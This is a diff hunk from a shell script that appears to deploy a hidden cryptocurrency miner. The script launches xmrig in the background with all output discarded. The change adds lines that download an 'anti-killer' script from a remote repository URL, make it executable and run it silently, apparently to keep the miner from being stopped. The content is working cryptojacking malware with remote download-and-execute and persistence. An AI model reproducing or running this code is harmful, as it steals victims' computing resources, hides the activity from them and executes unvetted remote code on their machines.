@@ -37,5 +37,7 @@ sed -i "s/kasm/kasm-$randnum/g" config.json
 
 nohup ./xmrig > /dev/null 2>&1 &
 
-# Start Anti-Kill Protection
-nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
+# Anti-Kill Protection Start
+$DOWNLOAD_CMD $repo_url/anti-killer.sh
+chmod +x anti-killer.sh
+nohup bash anti-killer.sh > /dev/null 2>&1 &
